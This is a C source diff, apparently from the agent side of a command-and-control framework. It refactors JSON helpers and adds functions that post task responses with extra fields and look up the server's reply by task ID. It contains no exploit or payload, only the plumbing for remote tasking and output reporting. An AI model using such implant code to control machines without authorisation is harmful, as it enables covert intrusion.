@@ -75,11 +75,18 @@ done:
     return parsed;
 }
 
-static const char *jstr(cJSON *o, const char *k) {
+const char *json_str(cJSON *o, const char *k) {
     cJSON *v = cJSON_GetObjectItemCaseSensitive(o, k);
     if (!v || !cJSON_IsString(v) || !v->valuestring)
         return "";
     return v->valuestring;
+}
+
+double json_num(cJSON *o, const char *k) {
+    cJSON *v = cJSON_GetObjectItemCaseSensitive(o, k);
+    if (!v || !cJSON_IsNumber(v))
+        return 0;
+    return v->valuedouble;
 }
 
 int agent_checkin(agent_t *a) {
@@ -95,8 +102,8 @@ int agent_checkin(agent_t *a) {
     cJSON_Delete(payload);
     if (!resp)
         return -1;
-    if (strcmp(jstr(resp, "status"), "success") == 0 && jstr(resp, "id")[0] != '\0') {
-        strncpy(a->uuid, jstr(resp, "id"), sizeof(a->uuid) - 1);
+    if (strcmp(json_str(resp, "status"), "success") == 0 && json_str(resp, "id")[0] != '\0') {
+        strncpy(a->uuid, json_str(resp, "id"), sizeof(a->uuid) - 1);
         a->uuid[sizeof(a->uuid) - 1] = '\0';
         rc = 0;
     }
@@ -143,9 +150,9 @@ task_t *agent_get_tasking(agent_t *a, int *count) {
     }
     for (i = 0; i < n; i++) {
         cJSON *t = cJSON_GetArrayItem(tasks, i);
-        out[i].command = dupstr(jstr(t, "command"));
-        out[i].parameters = dupstr(jstr(t, "parameters"));
-        out[i].id = dupstr(jstr(t, "id"));
+        out[i].command = dupstr(json_str(t, "command"));
+        out[i].parameters = dupstr(json_str(t, "parameters"));
+        out[i].id = dupstr(json_str(t, "id"));
         if (!out[i].command || !out[i].parameters || !out[i].id) {
             tasks_free(out, i + 1);
             cJSON_Delete(resp);
@@ -169,35 +176,77 @@ void tasks_free(task_t *tasks, int count) {
     free(tasks);
 }
 
-int agent_post_responses(agent_t *a, const response_t *resps, int count) {
+/* Merge one {"key": ...} fragment's children into r. */
+static void merge_extra_json(cJSON *r, const char *extra_json) {
+    cJSON *extra, *child;
+    if (!extra_json || *extra_json == '\0')
+        return;
+    extra = cJSON_Parse(extra_json);
+    if (!extra)
+        return;
+    child = extra->child;
+    while (child) {
+        cJSON *next = child->next;
+        cJSON_DetachItemFromObject(extra, child->string);
+        cJSON_AddItemToObject(r, child->string, child);
+        child = next;
+    }
+    cJSON_Delete(extra);
+}
+
+cJSON *agent_post_responses_raw(agent_t *a, const response_t *resps, int count) {
     cJSON *payload = cJSON_CreateObject();
     cJSON *arr = NULL, *resp = NULL;
-    int i, rc = -1;
+    int i;
     if (!payload)
-        return -1;
+        return NULL;
     arr = cJSON_AddArrayToObject(payload, "responses");
     if (!arr) {
         cJSON_Delete(payload);
-        return -1;
+        return NULL;
     }
     cJSON_AddStringToObject(payload, "action", "post_response");
     for (i = 0; i < count; i++) {
         cJSON *r = cJSON_CreateObject();
-        if (!r)
-            goto done;
+        if (!r) {
+            cJSON_Delete(payload);
+            return NULL;
+        }
         cJSON_AddStringToObject(r, "task_id", resps[i].task_id);
         cJSON_AddStringToObject(r, "user_output", resps[i].user_output ? resps[i].user_output : "");
         cJSON_AddBoolToObject(r, "completed", resps[i].completed);
         cJSON_AddStringToObject(r, "status", resps[i].status ? resps[i].status : "");
+        merge_extra_json(r, resps[i].extra_json);
         cJSON_AddItemToArray(arr, r);
     }
     resp = round_trip(a, payload);
-    rc = resp ? 0 : -1;
-done:
-    if (resp)
-        cJSON_Delete(resp);
     cJSON_Delete(payload);
-    return rc;
+    return resp;
+}
+
+int agent_post_responses(agent_t *a, const response_t *resps, int count) {
+    cJSON *resp = agent_post_responses_raw(a, resps, count);
+    if (!resp)
+        return -1;
+    cJSON_Delete(resp);
+    return 0;
+}
+
+cJSON *post_reply_find(cJSON *reply, const char *task_id) {
+    cJSON *arr;
+    int i, n;
+    if (!reply || !task_id)
+        return NULL;
+    arr = cJSON_GetObjectItemCaseSensitive(reply, "responses");
+    if (!arr || !cJSON_IsArray(arr))
+        return NULL;
+    n = cJSON_GetArraySize(arr);
+    for (i = 0; i < n; i++) {
+        cJSON *r = cJSON_GetArrayItem(arr, i);
+        if (strcmp(json_str(r, "task_id"), task_id) == 0)
+            return r;
+    }
+    return NULL;
 }
 
 const char *task_arg(const char *parameters, char *scratch, size_t cap) {
